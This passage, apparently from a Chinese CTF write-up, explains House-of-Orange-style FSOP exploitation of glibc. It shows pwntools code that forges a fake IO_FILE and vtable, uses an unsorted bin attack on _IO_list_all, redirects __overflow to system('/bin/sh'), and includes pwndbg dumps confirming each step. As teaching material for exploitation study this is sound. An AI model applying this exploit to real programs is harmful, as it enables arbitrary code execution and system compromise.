class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><span class="hljs-comment">//储存下一个IO_FILE的地址,这是关键,后面采用一种方法实现main_arena + 88的IO_FILE结构体的这个值指向我们所构造的fake IO_FILE</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>



<p>vtable表中结构</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sh">struct _IO_jump_t<br>&#123;<br>    JUMP_FIELD(size_t, __dummy);<br>    JUMP_FIELD(size_t, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow); //后面通过伪造IO_FILE使 会调用此函数指针,就修改这个为system<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    /* showmany */<br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-comment">#if 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-comment">#endif</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>后面就将这个<code>__overflow</code> 修改为system, 然而在调用这些函数指针的时候,传入的参数是IO_FILE的地址,所以后面我们需要在自己伪造的IO_FILE的头部填入’&#x2F;bin&#x2F;sh\x00’,若能使<code>_IO_flush_all_lockp</code>函数在遍历的时候遍历到我们伪造的IO_FILE,且IO_FILE满足<code>_IO_overflow</code>函数的调用条件, 这样就能实现get shell,那么怎样才能让我们伪造的IO_FILE连接到我们自己伪造的IO_FILE呢? </p>
<p>那使用unsorted bin attack修改<code>_IO_list_all</code>中main_arena + 0x58,后面就要得修改main_arena + 0x58处fkae IO_FILE的 chain为我们的fake IO_FILE地址,这样在执行<code>_IO_flush_all_lockp</code>就会根据自己伪造的IO_FILE调用我们所伪造的vtable函数了.但关键是怎样使<code>_IO_flush_all_lockp</code> 在遍历 IO_FILE的时候能遍历到我们伪造的IO_FILE,就要靠下面的操作了.</p>
<h3 id="修改main-arena-fake-file中的chain-指向我们即将伪造的IO-FILE"><a href="#修改main-arena-fake-file中的chain-指向我们即将伪造的IO-FILE" class="headerlink" title="修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE"></a>修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE</h3><p>上面的<code>_chain</code> 的值是我们重点要如何在main_arena + 0x58处IO_FILE中设置这个值为咱们可以掌控的fake IO_FILE地址,然而unsorted bin的链表结构已经被破坏,再次申请的时候,old top chunk就不受unsorted bin 管理,注意若大小小于0x400 的bin的管理顺序为unsorted bin -&gt; small bin,若我们修改old top chunk size 为小于0x400,就可以让当前chunk受small bin进行管理,而在small bin管理的时候, 各个大小的bin的链表头部地址会储存在main_arena中,若我们想要实现修改 main_arena + 0x58处 IO_FILE中的 <code>_chain</code>的值,就需要靠small bin的管理机制来进行修改</p>
<pre><code> 若我们能够计算好大小,就能实现在main_arena部分内存中储存我们的chunk地址.下面为修改old top chunk大小为0x50所看到main_arena + 0x58中IO_FILE的结构
</code></pre>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; p *((struct _IO_FILE_plus*)((long int)&amp;main_arena + 0x58))<br><span class="hljs-variable">$4</span> = &#123;<br>  file = &#123;<br>    _flags = 1433903120, <br>    _IO_read_ptr = 0x5555557584f0 <span class="hljs-string">&quot;/bin/sh&quot;</span>, <br>    _IO_read_end = 0x5555557584f0 <span class="hljs-string">&quot;/bin/sh&quot;</span>, <br>    _IO_read_base = 0x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>, <br>    _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="hljs-string">&quot;\360\204uUUU&quot;</span>, <br>    _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="hljs-string">&quot;\360\204uUUU&quot;</span>, <br>    _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="hljs-string">&quot;\210\033\335\367\377\177&quot;</span>, <br>    _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="hljs-string">&quot;\210\033\335\367\377\177&quot;</span>, <br>    _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="hljs-string">&quot;\230\033\335\367\377\177&quot;</span>, <br>    _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="hljs-string">&quot;\230\033\335\367\377\177&quot;</span>, <br>    _IO_backup_base = 0x5555557584f0 <span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-comment"># 这是small bin管理时,储存我们的堆地址</span><br>    _IO_save_end = 0x5555557584f0 <span class="hljs-string">&quot;/bin/sh&quot;</span>,    <span class="hljs-comment"># 这是small bin管理时,储存我们的堆地址</span><br>    _markers = 0x7ffff7dd1bc8 &lt;main_arena+168&gt;, <br>    _chain = 0x7ffff7dd1bc8 &lt;main_arena+168&gt;,  <span class="hljs-comment"># 下一个IO_FILE的地址,这是我们想要覆盖当前地址为old top chunk addr</span><br>    _fileno = -136504360, <br>    _flags2 = 32767, <br>    _old_offset = 140737351850968, <br>    _cur_column = 7144, <br>    _vtable_offset = -35 <span class="hljs-string">&#x27;\335&#x27;</span>, <br>    _shortbuf = &lt;incomplete sequence \367&gt;, <br>    _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;, <br>    _offset = 140737351851000, <br>    _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;, <br>    _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, <br>    _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, <br>    _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;, <br>    __pad5 = 140737351851032, <br>    _mode = -136504280, <br>    _unused2 = <span class="hljs-string">&quot;\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000&quot;</span><br>  &#125;, <br>  vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;<br>&#125;<br>pwndbg&gt; bin<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all [corrupted]<br>FD: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0<br>BK: 0x7ffff7dd2510 ◂— 0x0<br>smallbins<br>0x50: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0 <span class="hljs-comment">#释放后由small bin来管理</span><br>largebins<br>empty<br><br></code></pre></td></tr></table></figure>



<p>那么还差0x10,就改old top chunk size 为0x60,即可在main_arena 向下偏移0x10进行储存,这就实现了在main_arena + 0x58伪造IO_FILE中实现连接我们伪造的IO_FILE,实现效果如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; p *((struct _IO_FILE_plus*)0x00007ffff7dd1b78)<br><span class="hljs-variable">$2</span> = &#123;<br>  file = &#123;<br>    _flags = 1433903120, <br>    _IO_read_ptr = 0x5555557584f0 <span class="hljs-string">&quot;/bin/sh&quot;</span>, <br>    _IO_read_end = 0x5555557584f0 <span class="hljs-string">&quot;/bin/sh&quot;</span>, <br>    _IO_read_base = 0x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>, <br>    _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="hljs-string">&quot;\360\204uUUU&quot;</span>, <br>    _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="hljs-string">&quot;\360\204uUUU&quot;</span>, <br>    _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="hljs-string">&quot;\210\033\335\367\377\177&quot;</span>, <br>    _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="hljs-string">&quot;\210\033\335\367\377\177&quot;</span>, <br>    _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="hljs-string">&quot;\230\033\335\367\377\177&quot;</span>, <br>    _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="hljs-string">&quot;\230\033\335\367\377\177&quot;</span>, <br>    _IO_backup_base = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; <span class="hljs-string">&quot;\250\033\335\367\377\177&quot;</span>, <br>    _IO_save_end = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; <span class="hljs-string">&quot;\250\033\335\367\377\177&quot;</span>, <br>    _markers = 0x5555557584f0, <br>    _chain = 0x5555557584f0,  //这里指向 old top chunk,也就是我们伪造的堆块<br>    _fileno = -136504360, <br>    _flags2 = 32767, <br>    _old_offset = 140737351850968, <br>    _cur_column = 7144, <br>    _vtable_offset = -35 <span class="hljs-string">&#x27;\335&#x27;</span>, <br>    _shortbuf = &lt;incomplete sequence \367&gt;, <br>    _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;, <br>    _offset = 140737351851000, <br>    _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;, <br>    _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, <br>    _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, <br>    _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;, <br>    __pad5 = 140737351851032, <br>    _mode = -136504280, <br>    _unused2 = <span class="hljs-string">&quot;\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000&quot;</span><br>  &#125;, <br>  vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;<br>&#125;<br>pwndbg&gt; x /40gx 0x5555557584f0<br>0x5555557584f0:	0x0068732f6e69622f	0x0000000000000061 <span class="hljs-comment"># 我们的old top chunk</span><br>0x555555758500:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8<br>0x555555758510:	0x0000000000000000	0x0000000000000001<br>0x555555758520:	0x0000000000000000	0x0000000000000000<br>0x555555758530:	0x0000000000000000	0x0000000000000000<br>0x555555758540:	0x0000000000000000	0x0000000000000000<br>0x555555758550:	0x0000000000000000	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>利用如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Control program</span><br>p = <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x400</span><br>p += p64(<span class="hljs-number">0</span>)<br>p += p64(<span class="hljs-number">0x21</span>)<br>p += <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># fake IO_FILE</span><br>f = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># overflow arg -&gt; system(&#x27;/bin/sh&#x27;) 这是后续调用system会传入IO_FILE的地址</span><br>f += p64(<span class="hljs-number">0x61</span>)    <span class="hljs-comment"># small bin size,使main_arena + 0x58 fake IO_FILE的_chian指向当前伪造的IO_FILE</span><br>   <br>f += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>) <span class="hljs-comment"># unsoted bin attack 修改 _IO_list_all为main_arena + 0x58</span><br></code></pre></td></tr></table></figure>



<h3 id="伪造IO-FILE"><a href="#伪造IO-FILE" class="headerlink" title="伪造IO_FILE"></a>伪造IO_FILE</h3><p>上面就实现了修改main_arena + 0x58 中 fake IO_FILE的<code>_chain</code>指向我们的old top chunk,那么就在old top chunk伪造IO_FILE,在伪造的时候必须要得通过检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <br>           || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>               &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>           )<br>          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>        result = EOF;<br></code></pre></td></tr></table></figure>

<p>则fp-&gt;<code>_mode</code> &lt;&#x3D; 0 且fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 且<code>_IO_vtable_offset</code> (fp) &#x3D;&#x3D; 0,这样才能执行<code>_IO_OVERFLOW (fp, EOF) == EOF)</code></p>
<p>那么利用就可以这样写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fake file</span><br>	f = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># flag overflow arg -&gt; system(&#x27;/bin/sh&#x27;)</span><br>	f += p64(<span class="hljs-number">0x61</span>)    <span class="hljs-comment"># _IO_read_ptr small bin size</span><br>	<span class="hljs-comment">#  unsoted bin attack</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_read_end)</span><br>	f += p64(_IO_list_all - <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _IO_read_base</span><br><br>	<span class="hljs-comment">#bypass check</span><br>	<span class="hljs-comment"># 使fp-&gt;_IO_write_base &lt; fp-&gt;_IO_write_ptr绕过检查</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_write_base </span><br>	f += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># _IO_write_ptr</span><br><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_write_end</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_buf_base</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_buf_end</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_save_base</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_backup_base</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_save_end</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># *_markers</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># *_chain</span><br><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _fileno</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _flags2</span><br><br>	f += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _old_offset</span><br><br>	f += p16(<span class="hljs-number">2</span>) <span class="hljs-comment"># ushort _cur_colum;</span><br>	f += p8(<span class="hljs-number">3</span>)  <span class="hljs-comment"># char _vtable_offset</span><br>	f += p8(<span class="hljs-number">4</span>)  <span class="hljs-comment"># char _shrotbuf[1]</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># null for alignment</span><br><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _offset</span><br>	f += p64(<span class="hljs-number">6</span>) <span class="hljs-comment"># _codecvt</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _wide_data</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _freeres_list</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _freeres_buf</span><br><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># __pad5</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _mode 为了绕过检查,fp-&gt;mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _unused2</span><br>    <br></code></pre></td></tr></table></figure>

<p>修改结果如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; p *((struct _IO_FILE_plus*)0x5555557584f0)<br><span class="hljs-variable">$1</span> = &#123;<br>  file = &#123;<br>    _flags = 1852400175, <br>    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, <br>    _IO_read_end = 0x0, <br>    _IO_read_base = 0x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>, <br>    _IO_write_base = 0x0, <br>    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, <br>    _IO_write_end = 0x0, <br>    _IO_buf_base = 0x0, <br>    _IO_buf_end = 0x0, <br>    _IO_save_base = 0x0, <br>    _IO_backup_base = 0x0, <br>    _IO_save_end = 0x0, <br>    _markers = 0x0, <br>    _chain = 0x0, <br>    _fileno = 0, <br>    _flags2 = 0, <br>    _old_offset = 1, <br>    _cur_column = 2, <br>    _vtable_offset = 3 <span class="hljs-string">&#x27;\003&#x27;</span>, <br>    _shortbuf = <span class="hljs-string">&quot;\004&quot;</span>, <br>    _lock = 0x0, <br>    _offset = 6, <br>    _codecvt = 0x0, <br>    _wide_data = 0x0, <br>    _freeres_list = 0x0, <br>    _freeres_buf = 0x0, <br>    __pad5 = 0, <br>    _mode = 0, <br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;, <br>  vtable = 0x5555557585c8<br>&#125;<br><br></code></pre></td></tr></table></figure>


<h3 id="伪造-vtable"><a href="#伪造-vtable" class="headerlink" title="伪造 vtable"></a>伪造 vtable</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p += f<br>p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <span class="hljs-comment"># alignment to vtable</span><br>p += p64(heap + <span class="hljs-number">0x5c8</span>) <span class="hljs-comment"># vtable指向自己</span><br>p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span><br>p += p64(lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) <span class="hljs-comment"># _IO_overflow 位置改为system</span><br>   md(<span class="hljs-number">0x600</span>, p) <span class="hljs-comment"># 修改一系列所伪造好的布局</span><br>   <br></code></pre></td></tr></table></figure>

<p>修改结果如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; p *((struct _IO_FILE_plus*)0x5555557584f0).vtable<br><span class="hljs-variable">$2</span> = &#123;<br>  __dummy = 93824994346440, <br>  __dummy2 = 0, <br>  __finish = 0x0, <br>  __overflow = 0x7ffff7a52390 &lt;__libc_system&gt;, <span class="hljs-comment">#成功修改为system</span><br>  __underflow = 0x0, <br>  __uflow = 0x0, <br>  __pbackfail = 0x0, <br>  __xsputn = 0x0, <br>  __xsgetn = 0x0, <br>  __seekoff = 0x0, <br>  __seekpos = 0x0, <br>  __setbuf = 0x0, <br>  __sync = 0x0, <br>  __doallocate = 0x0, <br>  __read = 0x0, <br>  __write = 0x0, <br>  __seek = 0x0, <br>  __close = 0x0, <br>  __stat = 0x0, <br>  __showmanyc = 0x0, <br>  __imbue = 0x0<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="getshell-2"><a href="#getshell-2" class="headerlink" title="getshell"></a>getshell</h3><p>再次申请 0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;&#x3D; 2*SIZE_SZ，就会触发malloc_printerr,然后就开始执行各种已经布局好的各种trick,最终执行到system get shell</p>
